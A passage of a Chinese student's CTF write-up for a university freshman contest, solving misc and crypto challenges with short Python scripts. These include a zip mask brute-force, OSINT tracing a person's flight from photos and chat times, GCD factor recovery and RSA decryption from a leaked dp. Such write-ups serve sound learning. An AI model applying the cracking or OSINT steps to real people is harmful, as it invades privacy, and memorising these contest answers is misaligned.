{"title":"XAUT2025全国大学生信息安全竞赛新生预选赛-个人WP","slug":"XAUT2025 全国大学生信息安全竞赛新生预选 赛-WP","date":"2025-01-20T16:00:00.000Z","updated":"2025-09-27T13:50:05.114Z","comments":true,"path":"api/articles/XAUT2025 全国大学生信息安全竞赛新生预选 赛-WP.json","photos":[],"excerpt":"打了学校的校赛，拿了这届新生的NO.1，险胜，以下为个人部分WP...","covers":null,"content":"<p>作者： debu8ger </p>\n<p>队伍： GeekPwn02 </p>\n<p>总排名： 5</p>\n<p>排名： 1</p>\n<p>得分： 2563 </p>\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><hr>\n<h3 id=\"SignIn\"><a href=\"#SignIn\" class=\"headerlink\" title=\"SignIn\"></a>SignIn</h3><hr>\n<p>题目描述： </p>\n<p>%58%41%55%54%43%54%46%7B%57%65%31%63%30%6D%65%5F%74%30%5F%58%41%55%54 %43%54%46%7D </p>\n<hr>\n<p>直接拿到随波逐流里一把梭得到 flag </p>\n<h3 id=\"try\"><a href=\"#try\" class=\"headerlink\" title=\"try\"></a>try</h3><hr>\n<p>题目描述：黑客意外获得了 Peng 常用密码的前 5位<code> 13897</code> ，但不知道具体的位数，请你尝试恢复出完整 的密码。</p>\n<hr>\n<p>下载附件后， zip 文件加了密，拖到 ARCHPR 里。 根据题目描述，联想到用掩码 ,设置掩码为 13897??? ，不断尝试密码位数，最后为 13897?????? ，得出密码 为13897564231 。</p>\n<p>用密码得出 flag </p>\n<h3 id=\"沙滩，海洋，大冒险！\"><a href=\"#沙滩，海洋，大冒险！\" class=\"headerlink\" title=\"沙滩，海洋，大冒险！\"></a>沙滩，海洋，大冒险！</h3><hr>\n<p>题目描述： “Play, play, and a little competition ！”</p>\n<p>一到假期， BR 就迫不急待跑出去玩了！可恶，校赛题还没有出完呢，这怎么能行？！ </p>\n<p>BR 不愿意透露自己去哪里玩了，但是我们通过一些社会工程学手段打听到了一些信息。 现在你需要基于题目附件给出的提示推断出 BR 去哪里玩了，并且找到 BR 出发时 乘坐的那一班飞机！ flag 为： XAUTCTF{ 搭乘的飞机航班号 }</p>\n<p>示例：假如搭乘的是 1月31 日07:00-09:15 从北京首都国际机场飞往上海浦东国际机场的东航 MU5100 ，则flag 为： XAUTCTF{MU5100} </p>\n<hr>\n<p>附件下载后是几张图片，根据图片里的 “南沙湖景区 ”，在浏览器搜索得出在汉中的飞机场，再根据聊天记 录中的时间 1.7 出发， 22 ：50 的飞机得出航班为 GX8898 </p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h3 id=\"开心解方程\"><a href=\"#开心解方程\" class=\"headerlink\" title=\"开心解方程\"></a>开心解方程</h3><hr>\n<p>题目描述：解方程谁不会啊！我靠，这么大的数！ </p>\n<hr>\n<p>下载附件后打开： </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> *<br> <span class=\"hljs-keyword\">from</span> flag <span class=\"hljs-keyword\">import</span> real_flag<br> <span class=\"hljs-keyword\">import</span> random<br> <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">get_random_number</span>():<br> <span class=\"hljs-keyword\">return</span> random.randint(<span class=\"hljs-number\">10</span>**<span class=\"hljs-number\">1000</span>,<span class=\"hljs-number\">10</span>**<span class=\"hljs-number\">1001</span>)<br> a = bytes_to_long(real_flag)<br> b = get_random_number()<br> c = get_random_number()<br> d = get_random_number()<br> n1 = a*b<br> n2 = b*c<br> n3 = c*d<br> <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;n1 = <span class=\"hljs-subst\">&#123;n1&#125;</span>&quot;</span>)<br> <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;n2 = <span class=\"hljs-subst\">&#123;n2&#125;</span>&quot;</span>)<br> <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;n3 = <span class=\"hljs-subst\">&#123;n3&#125;</span>&quot;</span>)<br> <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;d = <span class=\"hljs-subst\">&#123;d&#125;</span>&quot;</span>)<br> <span class=\"hljs-string\">&quot;&quot;&quot;</span><br><span class=\"hljs-string\">n1 = </span><br><span class=\"hljs-string\">660450239937627676472423152753088762866493652912175035499026181480010556008370227</span><br><span class=\"hljs-string\"> 132820692782941399020078286652999758917091413843420294288183682337794567181698378</span><br><span class=\"hljs-string\"> 005190614956144552666986460330953742492949504762378684649291608293382476170196507</span><br><span class=\"hljs-string\"> 203860717478415630531428751980788146515223279726281602812659703309762797436048496</span><br><span class=\"hljs-string\"> 627911598377385262782778046800188003103442375618916707142674221670302396972922283</span><br><span class=\"hljs-string\"> 520054905593166294022196546718266472584050053300607686206198014313391408445437435</span><br><span class=\"hljs-string\"> 461419478264326992928539518498208034077320792110599071386379968059173966168861863</span><br><span class=\"hljs-string\"> 310563929045344315395731430000393330742178273782030232137271829338224042312738785</span><br><span class=\"hljs-string\"> 152236946900306968280222576625839634537180837030960604009475268281037277121979859</span><br><span class=\"hljs-string\"> 481286561762653987805286800510140743673637571353114984679475017659746968187968573</span><br><span class=\"hljs-string\"> 057934009318669305996594873342826450526329996481608343739819045332409118504519002</span><br><span class=\"hljs-string\"> 207477400866719610003935048350194103918864656918681643952118946067692088906775185</span><br><span class=\"hljs-string\"> 346231362247690338142322966940992512356418386457476687916237422414439983444353705</span><br><span class=\"hljs-string\"> 38812516231728525148001841752921696848750</span><br><span class=\"hljs-string\"> n2 = </span><br><span class=\"hljs-string\">132055559948771408099604477174510908640912495019380611591004400217163913272136993</span><br><span class=\"hljs-string\"> 624283235079308020015173158191553338936753084171134908531165485921070874516834813</span><br><span class=\"hljs-string\"> 976117599430837900823335294479519533702907533849170522341798957404618239390485873</span><br><span class=\"hljs-string\"> 877756550985342946026048577994521995745243228888275945684197374335095889775900584</span><br><span class=\"hljs-string\"> 018493535693551635367739929894727124030411094267858058173324359095354142826060871</span><br><span class=\"hljs-string\"> 855025402896480786226652143721749604469688715048143841581073559139793591057386368</span><br><span class=\"hljs-string\"> 662003982514297359734502803119229221447469362191444625907240976754170723813555216</span><br><span class=\"hljs-string\"> 696259448226530794490426262235682192406211548384519179216913469272608133976730073</span><br><span class=\"hljs-string\"> 740693350965705743473429521428183071140252726519187867319209698168797844265454686</span><br><span class=\"hljs-string\"> 604650858647625651544844781172441114327730413909755610663851775805294677760337341</span><br><span class=\"hljs-string\"> 471874320104145726238738815997034116160241320481623424055329647756212404950138137</span><br><span class=\"hljs-string\"> 201755652092058647070154954508993527680392400884226430281062546126537770580183644</span><br><span class=\"hljs-string\"> 562443912059541003914708424230090569341055501736533553073746674313903992403503206</span><br><span class=\"hljs-string\"> 857916767617208494549796807961852733026405952427948517952448304611149342659684628</span><br><span class=\"hljs-string\"> 569240855038143599794523207383276344355059600817779494420269353407710918628882281</span><br><span class=\"hljs-string\"> 209710568248306625094302589083556130775420236298436946727954741207366382680753425</span><br><span class=\"hljs-string\"> 658694529323561705425881551718193904002607996920204879424398104325533927369289415</span><br><span class=\"hljs-string\"> 066917692493833507884186060259837106601569745744140016374319263631306625671259175</span><br><span class=\"hljs-string\"> 725749415499428033183980555918740839725077368686680281827054943319958962854368269</span><br><span class=\"hljs-string\"> 697061677855152125336416555541049194632983874540006015609081285573904886020380480</span><br><span class=\"hljs-string\"> 815939450727082808598371168705113292836650171896662288041545378376290705384280571</span><br><span class=\"hljs-string\"> 907349030484957785736384072797454874730966709528617139563145541483208207493168201</span><br><span class=\"hljs-string\"> 036502003863127289159200256458071082412659606747201219742648312696937511042470016</span><br><span class=\"hljs-string\"> 665970393829748900730673247488465176447873096543614566319875241944650936502266014</span><br><span class=\"hljs-string\"> 7218357448783598847793577903599742398436141520668329522500</span><br><span class=\"hljs-string\">n3 = </span><br><span class=\"hljs-string\">249410272713998803165754891640007600846974535132227413971910865147969418539888390</span><br><span class=\"hljs-string\"> 073195689606460962553558928312743817847989934263100229022376128133508659027145332</span><br><span class=\"hljs-string\"> 511026307508686380224842234337426552003909228705197467042081026039559458721425938</span><br><span class=\"hljs-string\"> 098730849518727610240511003769836456879846902229417814578214601487649676894922723</span><br><span class=\"hljs-string\"> 462954711576107249045920865021523357612453775914962100509145273182613952283062735</span><br><span class=\"hljs-string\"> 895326241387273776619073614869159145539227349333374466068545601681226017756778478</span><br><span class=\"hljs-string\"> 970656850557932065579658939902181207185042720135934511308625418584279218810969482</span><br><span class=\"hljs-string\"> 187360886196754252103439195563518876634644835852209538418218191912157245441621484</span><br><span class=\"hljs-string\"> 746534825636136256651467843529859284555352243328258765980117242641670660964203471</span><br><span class=\"hljs-string\"> 733964221141765428089495089015946263582880444097689977702505016847310236571510768</span><br><span class=\"hljs-string\"> 439660043606739100605659424426677991950824300152769387504462598723123583198993392</span><br><span class=\"hljs-string\"> 920491550064242470431710380838595074587484332709028700667374217858019338913770751</span><br><span class=\"hljs-string\"> 233780840991911748572040679879955312564101137264045108984589666328288716593695705</span><br><span class=\"hljs-string\"> 628987313346676289541168447603290206899000688718335042566310836818080249745939265</span><br><span class=\"hljs-string\"> 766878889098243823775754170428574336166853448019828193151415593388977747007521853</span><br><span class=\"hljs-string\"> 462627419876286500597076433888660170265722292820282769078749796486423267732929410</span><br><span class=\"hljs-string\"> 579782033440976060073930532384320862660899912815510485687067091261411753169539876</span><br><span class=\"hljs-string\"> 689833347677430308001021169722778003692862579513640957940092905357037836527451598</span><br><span class=\"hljs-string\"> 294841312550447400930034141425085131602165292124625826119147029246119569825071322</span><br><span class=\"hljs-string\"> 961239430304131377656956479972476980119731750167986534701212222821155552705687935</span><br><span class=\"hljs-string\"> 372081227591635388891661558276169595275715422113441207510282320593295030888415098</span><br><span class=\"hljs-string\"> 837302380595809009588072616229131468353596837635562957862923207068829417296231130</span><br><span class=\"hljs-string\"> 002134233287119398969022114042157048675352691161235874217937559447389382292290724</span><br><span class=\"hljs-string\"> 611250564692584551972664442684936608785858133466701256968233101458604112191821224</span><br><span class=\"hljs-string\"> 2373332106875529757752615031856738830163693909495716952252</span><br><span class=\"hljs-string\"> d = </span><br><span class=\"hljs-string\">433649372657589561562736809113004896168988647467520522913503121627765152775872617</span><br><span class=\"hljs-string\"> 601174780309978948487118630623329285993553677703405155275957279564069754922608153</span><br><span class=\"hljs-string\"> 154985338337687221891537104845929137385323656737740520069497836713892798151396178</span><br><span class=\"hljs-string\"> 503110905146427254229932668338319430728026724929326990940122153602546409602279757</span><br><span class=\"hljs-string\"> 590528474512032428065493660727706292350992848548454374097053296992399965219450980</span><br><span class=\"hljs-string\"> 279948354644467259044536527730448427845444122562421182834303885763776785213056778</span><br><span class=\"hljs-string\"> 206306776574403086432100135804575686894687978437505218130338350044882355907368727</span><br><span class=\"hljs-string\"> 497314999595347129061253373714169034744396871198566741632582508619413746765301690</span><br><span class=\"hljs-string\"> 848796950206844814814100377730903357480581057890708058699990419019558244478361014</span><br><span class=\"hljs-string\"> 643171912366628244865206104432518650743908058177170171276657980747433307972075558</span><br><span class=\"hljs-string\"> 617764047083267897091305898360989080598358610366787147875243647574664400539203394</span><br><span class=\"hljs-string\"> 508901718521693792584822114894193675290489292453184418407413481891188937735907286</span><br><span class=\"hljs-string\"> 65799522362650234927535765626</span><br><span class=\"hljs-string\"> &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>通过代码审计，看到 n1 、n2 ，n3 已知，上面的 b、c、d是生成的随机数， n1 和n2 、n3 则是它们相乘，可 以用 GCD 算法逆向得出 a，即为真正的 flag 。</p>\n<p>得出 exp ：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> *<br> <span class=\"hljs-keyword\">from</span> math <span class=\"hljs-keyword\">import</span> gcd<br>n1 = <br><span class=\"hljs-number\">660450239937627676472423152753088762866493652912175035499026181480010556008370227</span><br> <span class=\"hljs-number\">132820692782941399020078286652999758917091413843420294288183682337794567181698378</span><br> 005190614956144552666986460330953742492949504762378684649291608293382476170196507<br> <span class=\"hljs-number\">203860717478415630531428751980788146515223279726281602812659703309762797436048496</span><br> <span class=\"hljs-number\">627911598377385262782778046800188003103442375618916707142674221670302396972922283</span><br> <span class=\"hljs-number\">520054905593166294022196546718266472584050053300607686206198014313391408445437435</span><br> <span class=\"hljs-number\">461419478264326992928539518498208034077320792110599071386379968059173966168861863</span><br> <span class=\"hljs-number\">310563929045344315395731430000393330742178273782030232137271829338224042312738785</span><br> <span class=\"hljs-number\">152236946900306968280222576625839634537180837030960604009475268281037277121979859</span><br> <span class=\"hljs-number\">481286561762653987805286800510140743673637571353114984679475017659746968187968573</span><br> 057934009318669305996594873342826450526329996481608343739819045332409118504519002<br> <span class=\"hljs-number\">207477400866719610003935048350194103918864656918681643952118946067692088906775185</span><br> <span class=\"hljs-number\">346231362247690338142322966940992512356418386457476687916237422414439983444353705</span><br> <span class=\"hljs-number\">38812516231728525148001841752921696848750</span><br> n2 = <br><span class=\"hljs-number\">132055559948771408099604477174510908640912495019380611591004400217163913272136993</span><br> <span class=\"hljs-number\">624283235079308020015173158191553338936753084171134908531165485921070874516834813</span><br> <span class=\"hljs-number\">976117599430837900823335294479519533702907533849170522341798957404618239390485873</span><br> <span class=\"hljs-number\">877756550985342946026048577994521995745243228888275945684197374335095889775900584</span><br> 018493535693551635367739929894727124030411094267858058173324359095354142826060871<br> <span class=\"hljs-number\">855025402896480786226652143721749604469688715048143841581073559139793591057386368</span><br> <span class=\"hljs-number\">662003982514297359734502803119229221447469362191444625907240976754170723813555216</span><br> <span class=\"hljs-number\">696259448226530794490426262235682192406211548384519179216913469272608133976730073</span><br> <span class=\"hljs-number\">740693350965705743473429521428183071140252726519187867319209698168797844265454686</span><br> <span class=\"hljs-number\">604650858647625651544844781172441114327730413909755610663851775805294677760337341</span><br> <span class=\"hljs-number\">471874320104145726238738815997034116160241320481623424055329647756212404950138137</span><br> <span class=\"hljs-number\">201755652092058647070154954508993527680392400884226430281062546126537770580183644</span><br> <span class=\"hljs-number\">562443912059541003914708424230090569341055501736533553073746674313903992403503206</span><br> <span class=\"hljs-number\">857916767617208494549796807961852733026405952427948517952448304611149342659684628</span><br> <span class=\"hljs-number\">569240855038143599794523207383276344355059600817779494420269353407710918628882281</span><br> <span class=\"hljs-number\">209710568248306625094302589083556130775420236298436946727954741207366382680753425</span><br> <span class=\"hljs-number\">658694529323561705425881551718193904002607996920204879424398104325533927369289415</span><br> 066917692493833507884186060259837106601569745744140016374319263631306625671259175<br> <span class=\"hljs-number\">725749415499428033183980555918740839725077368686680281827054943319958962854368269</span><br> <span class=\"hljs-number\">697061677855152125336416555541049194632983874540006015609081285573904886020380480</span><br> <span class=\"hljs-number\">815939450727082808598371168705113292836650171896662288041545378376290705384280571</span><br> <span class=\"hljs-number\">907349030484957785736384072797454874730966709528617139563145541483208207493168201</span><br> 036502003863127289159200256458071082412659606747201219742648312696937511042470016<br> <span class=\"hljs-number\">665970393829748900730673247488465176447873096543614566319875241944650936502266014</span><br> <span class=\"hljs-number\">7218357448783598847793577903599742398436141520668329522500</span><br>n3 = <br><span class=\"hljs-number\">249410272713998803165754891640007600846974535132227413971910865147969418539888390</span><br> 073195689606460962553558928312743817847989934263100229022376128133508659027145332<br> <span class=\"hljs-number\">511026307508686380224842234337426552003909228705197467042081026039559458721425938</span><br> 098730849518727610240511003769836456879846902229417814578214601487649676894922723<br> <span class=\"hljs-number\">462954711576107249045920865021523357612453775914962100509145273182613952283062735</span><br> <span class=\"hljs-number\">895326241387273776619073614869159145539227349333374466068545601681226017756778478</span><br> <span class=\"hljs-number\">970656850557932065579658939902181207185042720135934511308625418584279218810969482</span><br> <span class=\"hljs-number\">187360886196754252103439195563518876634644835852209538418218191912157245441621484</span><br> <span class=\"hljs-number\">746534825636136256651467843529859284555352243328258765980117242641670660964203471</span><br> <span class=\"hljs-number\">733964221141765428089495089015946263582880444097689977702505016847310236571510768</span><br> <span class=\"hljs-number\">439660043606739100605659424426677991950824300152769387504462598723123583198993392</span><br> <span class=\"hljs-number\">920491550064242470431710380838595074587484332709028700667374217858019338913770751</span><br> <span class=\"hljs-number\">233780840991911748572040679879955312564101137264045108984589666328288716593695705</span><br> <span class=\"hljs-number\">628987313346676289541168447603290206899000688718335042566310836818080249745939265</span><br> <span class=\"hljs-number\">766878889098243823775754170428574336166853448019828193151415593388977747007521853</span><br> <span class=\"hljs-number\">462627419876286500597076433888660170265722292820282769078749796486423267732929410</span><br> <span class=\"hljs-number\">579782033440976060073930532384320862660899912815510485687067091261411753169539876</span><br> <span class=\"hljs-number\">689833347677430308001021169722778003692862579513640957940092905357037836527451598</span><br> <span class=\"hljs-number\">294841312550447400930034141425085131602165292124625826119147029246119569825071322</span><br> <span class=\"hljs-number\">961239430304131377656956479972476980119731750167986534701212222821155552705687935</span><br> <span class=\"hljs-number\">372081227591635388891661558276169595275715422113441207510282320593295030888415098</span><br> <span class=\"hljs-number\">837302380595809009588072616229131468353596837635562957862923207068829417296231130</span><br> 002134233287119398969022114042157048675352691161235874217937559447389382292290724<br> <span class=\"hljs-number\">611250564692584551972664442684936608785858133466701256968233101458604112191821224</span><br> <span class=\"hljs-number\">2373332106875529757752615031856738830163693909495716952252</span><br> d = <br><span class=\"hljs-number\">433649372657589561562736809113004896168988647467520522913503121627765152775872617</span><br> <span class=\"hljs-number\">601174780309978948487118630623329285993553677703405155275957279564069754922608153</span><br> <span class=\"hljs-number\">154985338337687221891537104845929137385323656737740520069497836713892798151396178</span><br> <span class=\"hljs-number\">503110905146427254229932668338319430728026724929326990940122153602546409602279757</span><br> <span class=\"hljs-number\">590528474512032428065493660727706292350992848548454374097053296992399965219450980</span><br> <span class=\"hljs-number\">279948354644467259044536527730448427845444122562421182834303885763776785213056778</span><br> <span class=\"hljs-number\">206306776574403086432100135804575686894687978437505218130338350044882355907368727</span><br> <span class=\"hljs-number\">497314999595347129061253373714169034744396871198566741632582508619413746765301690</span><br> <span class=\"hljs-number\">848796950206844814814100377730903357480581057890708058699990419019558244478361014</span><br> <span class=\"hljs-number\">643171912366628244865206104432518650743908058177170171276657980747433307972075558</span><br> <span class=\"hljs-number\">617764047083267897091305898360989080598358610366787147875243647574664400539203394</span><br> <span class=\"hljs-number\">508901718521693792584822114894193675290489292453184418407413481891188937735907286</span><br> <span class=\"hljs-number\">65799522362650234927535765626</span><br> b = gcd(n1, n2)<br> a = n1 // b<br> c = n2 // b<br> real_flag = long_to_bytes(a)<br> <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&quot;THE real_flag: <span class=\"hljs-subst\">&#123;real_flag.decode()&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>\n\n<p>即可得到 flag 。</p>\n<h3 id=\"ezRSA\"><a href=\"#ezRSA\" class=\"headerlink\" title=\"ezRSA\"></a>ezRSA</h3><hr>\n<p>题目描述：这伞兵 BR 又出了什么抽象题？忍不了了！和 BR 爆了！！！ </p>\n<hr>\n<p>下载了附件后是 txt 文件，打开： </p>\n<p>e &#x3D; 65537 </p>\n<p>n &#x3D; 33896169649278787817413108531913159564802588344171700864708498661924206927271997490 45136855692986896313375718348538743048229582847210725029529834835813548058842302356 16224853229739254453896448014605235889565579360332680381264108519019900566994903905 05881187230673778366514722844167243102886788304917509722252674263436525922913096000 98944351229749957513453626264488620799659160485560680576771242990157 </p>\n<p>dp &#x3D; 40008312476670176077019320150135078093576233427810327258745387563367163532724088700 44433889118362883630676972295465773710150675576341453713705665281129523531268017856 3283946769876556761670653862586533 </p>\n<p>c &#x3D; 27517927422383474443348354524600841867994530350599275770033259060956283813207152505 38921636436471076761144030529733555087963190221733614651048234326074859224867616661 30746018102996787411650068046965914585541239006719172052235204702773905192301423559 48361827142449434679837060411450431072294284607048332335596884831364971047377659128 20183578092203043788325533521188107197615771966434225751684425810745 </p>\n<p>通过分析，已知公钥指数 e、模数 n、解密指数 dp 和密文 c，要得到明文。利用 RSA 知识 dp&#x3D;d mod(p−1) ，</p>\n<p>找到 p后，可以得到 q，计算 phi(n) 和d，</p>\n<p>最后利用中国剩余定理解密 c</p>\n<p>写exp ：         </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> inverse, isPrime, long_to_bytes<br> e = <span class=\"hljs-number\">65537</span><br> n = <br><span class=\"hljs-number\">338961696492787878174131085319131595648025883441717008647084986619242069272719974</span><br> <span class=\"hljs-number\">904513685569298689631337571834853874304822958284721072502952983483581354805884230</span><br> <span class=\"hljs-number\">235616224853229739254453896448014605235889565579360332680381264108519019900566994</span><br> <span class=\"hljs-number\">903905058811872306737783665147228441672431028867883049175097222526742634365259229</span><br> <span class=\"hljs-number\">1309600098944351229749957513453626264488620799659160485560680576771242990157</span><br> dp = <br><span class=\"hljs-number\">400083124766701760770193201501350780935762334278103272587453875633671635327240887</span><br> 004443388911836288363067697229546577371015067557634145371370566528112952353126801<br> <span class=\"hljs-number\">78563283946769876556761670653862586533</span><br>c = <br><span class=\"hljs-number\">275179274223834744433483545246008418679945303505992757700332590609562838132071525</span><br> 053892163643647107676114403052973355508796319022173361465104823432607485922486761<br> <span class=\"hljs-number\">666130746018102996787411650068046965914585541239006719172052235204702773905192301</span><br> <span class=\"hljs-number\">423559483618271424494346798370604114504310722942846070483323355968848313649710473</span><br> <span class=\"hljs-number\">7765912820183578092203043788325533521188107197615771966434225751684425810745</span><br> <span class=\"hljs-keyword\">for</span> k <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>, e):<br> p = (e * dp - <span class=\"hljs-number\">1</span>) // k + <span class=\"hljs-number\">1</span><br> <span class=\"hljs-keyword\">if</span> (e * dp - <span class=\"hljs-number\">1</span>) % k == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> isPrime(p) <span class=\"hljs-keyword\">and</span> n % p == <span class=\"hljs-number\">0</span>:<br> q = n // p<br> <span class=\"hljs-keyword\">if</span> isPrime(q):<br> <span class=\"hljs-keyword\">break</span><br> phi = (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)<br> d = inverse(e, phi)<br> dq = d % (q-<span class=\"hljs-number\">1</span>)<br> m_p = <span class=\"hljs-built_in\">pow</span>(c, dp, p)<br> m_q = <span class=\"hljs-built_in\">pow</span>(c, dq, q)<br> h = (inverse(q, p) * (m_p - m_q)) % p<br> m = (m_q + h * q)<br> flag = long_to_bytes(m).decode()<br> <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;解密后的flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure>\n\n<p>得到 flag </p>\n<h3 id=\"private-key\"><a href=\"#private-key\" class=\"headerlink\" title=\"private key\"></a>private key</h3><hr>\n<p>题目描述：众所周知，公钥加密，私钥解密，那么没有私钥，这怎么解密？ </p>\n<p>hint: 私钥生成所需要的 p，q如何从公钥的 n中获得呢？ </p>\n<hr>\n<p>下载附件得到三个文件： attachment.py 、flag.enc 和public_key.pem ，这个题是已知公钥，无私钥，则我们要得到私钥后才能解密 flag.enc ，放到 kali 